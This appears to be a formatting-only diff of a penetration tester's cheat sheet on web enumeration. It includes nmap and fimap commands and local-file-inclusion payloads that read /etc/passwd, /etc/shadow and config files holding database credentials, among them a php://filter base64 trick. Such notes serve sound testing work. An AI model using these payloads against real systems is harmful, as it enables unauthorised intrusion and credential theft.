@@ -8,7 +8,7 @@ Web enumeration
     *$ nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip*
 Test
     Nmap Check the server methods
-    * $     *nmap --script http-methods --script-args http-methods.url-path='/test' $ip **
+    * $ nmap --script http-methods --script-args http-methods.url-path='/test' $ip *
     Test OPTIONS against every folder/file.
     Test every GET/POST parameter against SQLI and RCE.
 
@@ -32,7 +32,7 @@ RFI/LFI
     Test it:
     *$ fimap -u "http://$ip/example.php?test="*
     Interesting payloads:
-    */etc/passwd | /etc/shadow #instant win
+    */etc/passwd | /etc/shadow #instant win*
     */var/www/html/config.php # or similar paths to get SQL etc creds*
     *?page=php://filter/convert.base64-encode/resource=../config.php*
     *../../../../../boot.ini # to find out windows version**
